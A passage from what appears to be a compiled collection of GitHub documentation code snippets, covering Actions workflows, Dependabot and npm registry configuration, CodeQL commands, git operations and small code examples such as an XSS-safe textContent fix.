for `Octokit::RateLimitExceeded` errors, extracts the reset time from the headers, and retries the request after waiting.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\ndef request_retry(route, parameters)\n begin\n response = octokit.request(route, parameters)\n return response\n rescue Octokit::RateLimitExceeded => error\n reset_time_epoch_seconds = error.response.headers['x-ratelimit-reset'].to_i\n current_time_epoch_seconds = Time.now.to_i\n seconds_to_wait = reset_time_epoch_seconds - current_time_epoch_seconds\n puts \"You have exceeded your rate limit. Retrying in #{seconds_to_wait} seconds.\"\n sleep(seconds_to_wait)\n retry\n rescue Octokit::Error => error\n puts error\n end\n end\n\n response = request_retry(\"GET /repos/{owner}/{repo}/issues\", owner: \"github\", repo: \"docs\", per_page: 2)\n```\n\n----------------------------------------\n\nTITLE: Specifying Exact Node.js Versions\nDESCRIPTION: This example demonstrates how to specify exact Node.js versions for testing.  Instead of using wildcards, specific versions like '10.17.0' and '17.9.0' are defined in the `node-version` matrix.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nstrategy:\n  matrix:\n    node-version: ['10.17.0', '17.9.0']\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Private npm Registry in GitHub Actions (YAML)\nDESCRIPTION: This workflow configures authentication with a private npm registry using the `setup-node` action. It sets up the `.npmrc` file by setting the `NODE_AUTH_TOKEN` environment variable with the value of the `NPM_TOKEN` secret. The workflow checks out the code, configures Node.js, installs dependencies using `npm ci`, and passes the authentication token as an environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Use Node.js\n  uses: {% data reusables.actions.action-setup-node %}\n  with:\n    always-auth: true\n    node-version: '20.x'\n    registry-url: https://registry.npmjs.org\n    scope: '@octocat'\n- name: Install dependencies\n  run: npm ci\n  env:\n    NODE_AUTH_TOKEN: {% raw %}${{ secrets.NPM_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Renaming a Local Branch with Git\nDESCRIPTION: These commands rename a local branch to match the renamed branch on the remote repository and update the tracking information. It requires Git to be installed and configured. The commands assume the user is in the root directory of their local Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/configuring-branches-and-merges-in-your-repository/managing-branches-in-your-repository/renaming-a-branch.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit branch -m OLD-BRANCH-NAME NEW-BRANCH-NAME\ngit fetch origin\ngit branch -u origin/NEW-BRANCH-NAME NEW-BRANCH-NAME\ngit remote set-head origin -a\n```\n\n----------------------------------------\n\nTITLE: Using Secrets in GitHub Actions Workflow\nDESCRIPTION: This snippet demonstrates how to define and use a secret within a GitHub Actions workflow file. The `secrets.PUBLISH_KEY` references a secret stored in the repository settings. This secret can be accessed by the `fakeaction/publish@v3` action. Using secrets this way allows sensitive information to be passed to actions without being hardcoded into the workflow file.\nSOURCE: https://github.com/github/docs/blob/main/content/enterprise-onboarding/github-actions-for-your-enterprise/security-hardening-for-github-actions.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nuses: fakeaction/publish@v3\nwith:\n    key: ${{ secrets.PUBLISH_KEY }}\n```\n\n----------------------------------------\n\nTITLE: Specifying Additional Queries in CodeQL Configuration - YAML\nDESCRIPTION: This YAML snippet demonstrates how to specify additional queries to be run by CodeQL.  It uses the `queries` array and the `uses` parameter to point to query files, directories of query files, or query suite definition files.  The `uses` parameter accepts a path relative to the repository root.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\nqueries:\n  - uses: ./my-basic-queries/example-query.ql\n  - uses: ./my-advanced-queries\n  - uses: ./query-suites/my-security-queries.qls\n```\n\n----------------------------------------\n\nTITLE: Complete GitHub Actions configuration example\nDESCRIPTION: This snippet presents a complete GitHub Actions configuration equivalent to the CircleCI example. It defines a workflow that runs tests against multiple Ruby versions, utilizing a PostgreSQL service container. It includes steps for checking out code, setting up Ruby, caching dependencies, installing PostgreSQL headers, setting up the environment and database, and running tests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\nname: Containers\n\non: [push]\n\njobs:\n  build:\n\n    strategy:\n      matrix:\n        ruby: ['2.5', '2.6.3']\n\n    runs-on: ubuntu-latest\n\n    env:\n      PGHOST: localhost\n      PGUSER: administrate\n      RAILS_ENV: test\n\n    services:\n      postgres:\n        image: postgres:10.1-alpine\n        env:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n        ports:\n          - 5432:5432\n        # Add a health check\n        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Ruby\n        uses: eregon/use-ruby-action@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: {% raw %}${{ matrix.ruby }}{% endraw %}\n      - name: Cache dependencies\n        uses: {% data reusables.actions.action-cache %}\n        with:\n          path: vendor/bundle\n          key: administrate-{% raw %}${{ matrix.image }}-${{ hashFiles('Gemfile.lock') }}{% endraw %}\n      - name: Install postgres headers\n        run: |\n          sudo apt-get update\n          sudo apt-get install libpq-dev\n      - name: Install dependencies\n        run: bundle install --path vendor/bundle\n      - name: Setup environment configuration\n        run: cp .sample.env .env\n      - name: Setup database\n        run: bundle exec rake db:setup\n      - name: Run tests\n        run: bundle exec rake\n      - name: Install appraisal\n        run: bundle exec appraisal install\n      - name: Run appraisal\n        run: bundle exec appraisal rake\n```\n\n----------------------------------------\n\nTITLE: Setting a debug message in Bash\nDESCRIPTION: This snippet demonstrates how to set a debug message using the `debug` workflow command in Bash. Debug messages are only visible if the `ACTIONS_STEP_DEBUG` secret is set to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\necho \"::debug::Set the Octocat variable\"\n```\n\n----------------------------------------\n\nTITLE: Defining a Matrix Strategy in GitHub Actions Workflow YAML\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow job that uses a matrix strategy. The matrix creates multiple jobs based on combinations of `os` and `node` versions. The `include` section adds an `npm` variable when `os` is `windows-latest` and `node` is `16`.  It then sets up the node version and optionally installs a specific npm version based on the matrix.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-expand-with-include.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [windows-latest, ubuntu-latest]\n        node: [14, 16]\n        include:\n          - os: windows-latest\n            node: 16\n            npm: 6\n    runs-on: {% raw %}${{ matrix.os }}{% endraw %}\n    steps:\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: {% raw %}${{ matrix.node }}{% endraw %}\n      - if: {% raw %}${{ matrix.npm }}{% endraw %}\n        run: npm install -g npm@{% raw %}${{ matrix.npm }}{% endraw %}\n      - run: npm --version\n```\n\n----------------------------------------\n\nTITLE: Refactoring to Switch Statement in Java\nDESCRIPTION: This Java method refactors the if/else if block to use a switch statement for determining the sound of an animal. It utilizes Java 21 syntax including a null case and 'when' guards for case-insensitive comparisons, additionally includes documentation. It improves readability and makes the code more concise.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * Retrieves the sound made by a given animal.\n *\n * @param animal The name of the animal.\n * @return The sound made by the animal, or \"Unknown\" if the animal is not recognized.\n */\npublic String getAnimalSound(String animal) {\n    return switch (animal) {\n        case null -> {\n            System.out.println(\"Oops! A null animal?\");\n            yield \"Unknown\";\n        }\n        case String a when a.equalsIgnoreCase(\"Dog\") -> \"Bark\";\n        case String a when a.equalsIgnoreCase(\"Cat\") -> \"Meow\";\n        case String a when a.equalsIgnoreCase(\"Bird\") -> \"Tweet\";\n        default -> \"Unknown\";\n    };\n}\n```\n\n----------------------------------------\n\nTITLE: Packaging Artifacts with Maven\nDESCRIPTION: This workflow snippet demonstrates how to package Maven build artifacts (e.g., JAR files) and upload them as workflow artifacts. It runs the Maven verify phase, creates a staging directory, copies the JAR files from the `target` directory to the staging directory, and then uploads the contents of the staging directory using the `upload-artifact` action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - run: mvn --batch-mode --update-snapshots verify\n  - run: mkdir staging && cp target/*.jar staging\n  - uses: {% data reusables.actions.action-upload-artifact %}\n    with:\n      name: Package\n      path: staging\n```\n\n----------------------------------------\n\nTITLE: Configuring .npmrc for Multiple Organizations (Shell, GHES - subdomain isolation disabled)\nDESCRIPTION: This snippet shows how to configure the `.npmrc` file to install packages from multiple organizations when subdomain isolation is disabled on GitHub Enterprise Server.  Replace `NAMESPACE` with the name of the organization. This ensures that npm can resolve packages from different organizations.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\n@NAMESPACE:registry=https://HOSTNAME/_registry/npm\n@NAMESPACE:registry=https://HOSTNAME/_registry/npm\n```\n\n----------------------------------------\n\nTITLE: Initializing devcontainer.json for C# (.NET)\nDESCRIPTION: This code snippet shows the initial configuration of the `devcontainer.json` file for a C# (.NET) project within GitHub Codespaces. It defines the container's name, image (using a pre-built .NET dev container image), and includes a .NET feature. The file also contains commented-out examples for forwarding ports, running post-creation commands, and customizing tool-specific properties. It serves as a starting point for customizing the development environment.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-dotnet-project-for-codespaces.md#_snippet_0\n\nLANGUAGE: JSONC\nCODE:\n```\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/dotnet\n{\n  \"name\": \"C# (.NET)\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/dotnet:0-7.0\",\n  \"features\": {\n    \"ghcr.io/devcontainers/features/dotnet:1\": {}\n  }\n\n  // Features to add to the dev container. More info: https://containers.dev/features.\n  // \"features\": {},\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [5000, 5001],\n  // \"portsAttributes\": {\n  //   \"5001\": {\n  //     \"protocol\": \"https\"\n  //   }\n  // }\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  // \"postCreateCommand\": \"dotnet restore\",\n\n  // Configure tool-specific properties.\n  // \"customizations\": {},\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n\n```\n\n----------------------------------------\n\nTITLE: Installing GCM with Homebrew on macOS\nDESCRIPTION: This snippet shows how to install Git Credential Manager (GCM) on macOS using Homebrew. GCM securely stores Git credentials. This is a key step for enabling automatic credential management for HTTPS connections.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/caching-your-github-credentials-in-git.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbrew install --cask git-credential-manager\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer\nDESCRIPTION: This command updates the GitHub Actions Importer CLI to the latest version by connecting to the GitHub Container Registry and pulling the most recent container image. It ensures the CLI is up-to-date before performing migrations.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Conditional Expressions in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to use conditional expressions in GitHub Actions workflows. It uses the `if` key and infix notation (e.g., `==` for equality) to define conditions based on environment variable values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  conditional:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        if: ${{ env.str == 'ABC' && env.num == 123 }}\n```\n\n----------------------------------------\n\nTITLE: Workflow Using `runner` Context - YAML\nDESCRIPTION: This YAML workflow utilizes the `runner` context to define the path for temporary build logs. If the build fails, the workflow uploads these logs as an artifact. The `runner.temp` property provides the path to the temporary directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Build with logs\n        run: |\n          mkdir {% raw %}${{ runner.temp }}{% endraw %}/build_logs\n          echo \"Logs from building\" > {% raw %}${{ runner.temp }}{% endraw %}/build_logs/build.logs\n          exit 1\n      - name: Upload logs on fail\n        if: {% raw %}${{ failure() }}{% endraw %}\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: Build failure logs\n          path: {% raw %}${{ runner.temp }}{% endraw %}/build_logs\n```\n\n----------------------------------------\n\nTITLE: Configuring Workflow Permissions for Artifact Attestations (YAML)\nDESCRIPTION: This YAML snippet demonstrates the necessary permissions for both the calling workflow and the reusable workflow when generating artifact attestations. It grants write access to attestations and packages (for container images), read access to contents, and write access for the ID token.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\npermissions:\n  attestations: write\n  contents: read\n  id-token: write\n```\n\n----------------------------------------\n\nTITLE: Installing ARC with Helm\nDESCRIPTION: This code snippet demonstrates how to install the Actions Runner Controller (ARC) using Helm. It sets the namespace and installs the chart from the GitHub Container Registry.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nNAMESPACE=\"arc-systems\"\nhelm install arc \\\n    --namespace \"{% raw %}${NAMESPACE}{% endraw %}\" \\\n    --create-namespace \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer\nDESCRIPTION: Configures the GitHub Actions Importer CLI with credentials for GitHub and Azure DevOps. Prompts the user for {% data variables.product.pat_generic_caps %} for GitHub, the base URL of the GitHub instance, {% data variables.product.pat_generic_caps %} for Azure DevOps, the base URL of the Azure DevOps instance, the Azure DevOps organization name, and the Azure DevOps project name. Stores these as environment variables for subsequent CLI commands.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Configuring Maven with Github Packages in dependabot.yml\nDESCRIPTION: This snippet configures Maven to use GitHub Packages in `dependabot.yml`. It defines a registry for GitHub Packages, specifying the URL, username, and a personal access token (PAT) as the password, stored as a secret.  It then configures Dependabot to update Maven dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nregistries:\n  maven-github:\n    type: maven-repository\n    url: https://maven.pkg.github.com/octocat\n    username: octocat\n    password: ${{secrets.OCTOCAT_GITHUB_PAT}}\nupdates:\n  - package-ecosystem: \"maven\"\n    directory: \"/\"\n    registries:\n      - maven-github\n    schedule:\n      interval: \"monthly\"\n```\n\n----------------------------------------\n\nTITLE: GitHub Context Example\nDESCRIPTION: This JSON snippet shows the contents of the `github` context in a GitHub Actions workflow run, specifically triggered by a `push` event. It includes information about the repository, ref, SHA, actor, workflow, event, and URLs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"token\": \"***\",\n  \"job\": \"dump_contexts_to_log\",\n  \"ref\": \"refs/heads/my_branch\",\n  \"sha\": \"c27d339ee6075c1f744c5d4b200f7901aad2c369\",\n  \"repository\": \"octocat/hello-world\",\n  \"repository_owner\": \"octocat\",\n  \"repositoryUrl\": \"git://github.com/octocat/hello-world.git\",\n  \"run_id\": \"1536140711\",\n  \"run_number\": \"314\",\n  \"retention_days\": \"90\",\n  \"run_attempt\": \"1\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"Context testing\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"push\",\n  \"event\": {\n    ...\n  },\n  \"server_url\": \"https://github.com\",\n  \"api_url\": \"https://api.github.com\",\n  \"graphql_url\": \"https://api.github.com/graphql\",\n  \"ref_name\": \"my_branch\",\n  \"ref_protected\": false,\n  \"ref_type\": \"branch\",\n  \"secret_source\": \"Actions\",\n  \"workspace\": \"/home/runner/work/hello-world/hello-world\",\n  \"action\": \"github_step\",\n  \"event_path\": \"/home/runner/work/_temp/_github_workflow/event.json\",\n  \"action_repository\": \"\",\n  \"action_ref\": \"\",\n  \"path\": \"/home/runner/work/_temp/_runner_file_commands/add_path_b037e7b5-1c88-48e2-bf78-eaaab5e02602\",\n  \"env\": \"/home/runner/work/_temp/_runner_file_commands/set_env_b037e7b5-1c88-48e2-bf78-eaaab5e02602\"\n}\n```\n\n----------------------------------------\n\nTITLE: Uploading CodeQL Results with Token from Secret Store - Shell\nDESCRIPTION: This snippet demonstrates how to upload CodeQL analysis results to GitHub using the `codeql github upload-results` command. It retrieves a {% data variables.product.prodname_github_app %} or {% data variables.product.pat_generic %} from a secret store, pipes it to the `codeql` command via standard input using the `--github-auth-stdin` option. Replace `<call-to-retrieve-secret>` with the actual command to fetch the secret. Ensure the repository, ref, commit, and SARIF file paths are correctly specified. It requires CodeQL CLI to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/uploading-codeql-analysis-results-to-github.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n<call-to-retrieve-secret> | codeql github upload-results \\\n    --repository=<repository-name> \\\n    --ref=<ref> --commit=<commit> \\\n    --sarif=<file> {% ifversion ghes %}--github-url=<URL> \\\n    {% endif %}--github-auth-stdin\n```\n\n----------------------------------------\n\nTITLE: Installing GitHub Copilot CLI Extension\nDESCRIPTION: This command installs the GitHub Copilot CLI extension.  It uses the `gh extension install` command and specifies the `github/gh-copilot` repository. The extension allows users to access Copilot features within the command line.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/installing-github-copilot-in-the-cli.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension install github/gh-copilot\n```\n\n----------------------------------------\n\nTITLE: Defining Job Environment Variables\nDESCRIPTION: This YAML snippet shows how to define environment variables specific to a job using `jobs.<job_id>.env`. These variables are accessible by all steps within that particular job.  The example sets the `FIRST_NAME` variable to `Mona` for the `job1` job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job1:\n    env:\n      FIRST_NAME: Mona\n```\n\n----------------------------------------\n\nTITLE: Packaging Ant build artifacts\nDESCRIPTION: This YAML snippet showcases how to upload build artifacts produced by an Ant build process. It sets up the Java environment, executes the Ant build, and then uses the `upload-artifact` action to store the contents of the `build/jar` directory as a workflow artifact named 'Package'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - run: ant -noinput -buildfile build.xml\n  - uses: {% data reusables.actions.action-upload-artifact %}\n    with:\n      name: Package\n      path: build/jar\n```\n\n----------------------------------------\n\nTITLE: Example YAML issue form template\nDESCRIPTION: This snippet demonstrates a YAML issue form template equivalent to the Markdown template. It utilizes various input types like checkboxes and textareas. It includes attributes for labels, descriptions, validations, and placeholders.  It shows how to define the structure and validation rules for each form element.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-issue-forms.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: 🐞 Bug\ndescription: File a bug/issue\ntitle: \"[BUG] <title>\"\nlabels: [\"Bug\", \"Needs Triage\"]\nbody:\n- type: checkboxes\n  attributes:\n    label: Is there an existing issue for this?\n    description: Please search to see if an issue already exists for the bug you encountered.\n    options:\n    - label: I have searched the existing issues\n      required: true\n- type: textarea\n  attributes:\n    label: Current Behavior\n    description: A concise description of what you're experiencing.\n  validations:\n    required: false\n- type: textarea\n  attributes:\n    label: Expected Behavior\n    description: A concise description of what you expected to happen.\n  validations:\n    required: false\n- type: textarea\n  attributes:\n    label: Steps To Reproduce\n    description: Steps to reproduce the behavior.\n    placeholder: |\n      1. In this environment...\n      1. With this config...\n      1. Run '...'\n      1. See error...\n  validations:\n    required: false\n- type: textarea\n  attributes:\n    label: Environment\n    description: |\n      examples:\n        - **OS**: Ubuntu 20.04\n        - **Node**: 13.14.0\n        - **npm**: 7.6.3\n    value: |\n        - OS:\n        - Node:\n        - npm:\n    render: markdown\n  validations:\n    required: false\n- type: textarea\n  attributes:\n    label: Anything else?\n    description: |\n      Links? References? Anything that will give us more context about the issue you are encountering!\n\n      Tip: You can attach images or log files by clicking this area to highlight it and then dragging files in.\n  validations:\n    required: false\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer - Bash\nDESCRIPTION: This command configures credentials for GitHub Actions Importer to communicate with GitHub and your CI server. This step is necessary for the tool to interact with your environments and perform the migration process.  The command is executed via the `gh` CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Downloading CodeQL Packs from GitHub Enterprise Server\nDESCRIPTION: This YAML snippet configures the `codeql-action/init` action to download CodeQL packs from a GitHub Enterprise Server instance. It utilizes the `registries` input to specify the URL, package patterns, and a token for authenticating with the registry. The token should have `read:packages` permission.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    registries: {% raw %}|\n      # URL to the container registry, usually in this format\n      - url: https://containers.GHEHOSTNAME1/v2/\n\n        # List of package glob patterns to be found at this registry\n        packages:\n          - my-company/*\n          - my-company2/*\n\n        # Token, which should be stored as a secret\n        token: ${{ secrets.GHEHOSTNAME1_TOKEN }}\n\n      # URL to the default container registry\n      - url: https://ghcr.io/v2/\n        # Packages can also be a string\n        packages: \"*/*\"\n        token: ${{ secrets.GHCR_TOKEN }}\n\n    {% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Display Name with XSS Fix - JavaScript\nDESCRIPTION: This JavaScript code snippet provides a fix to the potential XSS vulnerability. The `displayName` function retrieves an HTML element by its ID and sets its `textContent` property instead of `innerHTML`.  By setting `textContent`, the `name` parameter will be treated as plain text and any HTML characters will be escaped, preventing XSS attacks.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/security-analysis/finding-existing-vulnerabilities-in-code.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction displayName(name) {\n  const nameElement = document.getElementById('name-display');\n  nameElement.textContent = `Showing results for \"${name}\"`;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring rubygems-server with username and password (YAML)\nDESCRIPTION: This snippet demonstrates how to configure a `rubygems-server` registry using a username and password for authentication.  It defines the registry type, URL, username, and password, and specifies that it replaces the base registry. The password is provided as a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  ruby-example:\n    type: rubygems-server\n    url: https://rubygems.example.com\n    username: octocat@example.com\n    password: ${{secrets.MY_RUBYGEMS_PASSWORD}}\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Defining Inputs and Secrets in Reusable Workflow - YAML\nDESCRIPTION: This YAML snippet demonstrates how to define inputs and secrets for a reusable workflow using the `workflow_call` event. The `inputs` and `secrets` keys specify the inputs and secrets that can be passed from the calling workflow.  `required` specifies whether the input/secret is mandatory. `type` specifies the data type of the input.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_call:\n    inputs:\n      config-path:\n        required: true\n        type: string\n    secrets:\n      personal_access_token:\n        required: true\n```\n\n----------------------------------------\n\nTITLE: Pushing all Git LFS files\nDESCRIPTION: This command pushes all referenced Git Large File Storage (LFS) files to the remote repository.  It ensures that all LFS objects are uploaded to the origin. This command is essential for completing LFS uploads and resolving integrity check errors.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/resolving-git-large-file-storage-upload-failures.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit lfs push --all origin\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Databases for JavaScript/TypeScript\nDESCRIPTION: This shell script shows how to create a CodeQL database for JavaScript and TypeScript code.  It uses the `codeql database create` command, specifying `--language=javascript-typescript`. The `--source-root` option defines the location where database creation is executed. Node.js 14 or higher must be installed and available on the `PATH` as `node` if TypeScript files are present. By default, files in `node_modules` and `bower_components` are not extracted.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create --language=javascript-typescript --source-root <folder-to-extract> <output-folder>/javascript-database\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer CLI - Bash\nDESCRIPTION: This command updates the GitHub Actions Importer CLI to the latest version.  It ensures that you are using the most recent features and bug fixes.  The command is executed via the `gh` CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Publish Docker Image to Docker Hub with GitHub Actions\nDESCRIPTION: This workflow defines a GitHub Actions pipeline that triggers on a `release` event of type `published`. It checks out the repository, logs into Docker Hub using provided secrets for username and password, extracts metadata, builds a Docker image using a Dockerfile in the repository's root, tags the image, and pushes it to Docker Hub. Optionally, it generates and pushes artifact attestations. The workflow requires the `docker/login-action` and `docker/build-push-action` actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-docker-images.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\n\njobs:\n  push_to_registry:\n    name: Push Docker image to Docker Hub\n    runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n    permissions:\n      packages: write\n      contents: read\n      {% ifversion artifact-attestations %}attestations: write{% endif %}\n      {% ifversion artifact-attestations %}id-token: write{% endif %}\n    steps:\n      - name: Check out the repo\n        uses: {% data reusables.actions.action-checkout %}\n\n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: {% raw %}${{ secrets.DOCKER_USERNAME }}{% endraw %}\n          password: {% raw %}${{ secrets.DOCKER_PASSWORD }}{% endraw %}\n\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: 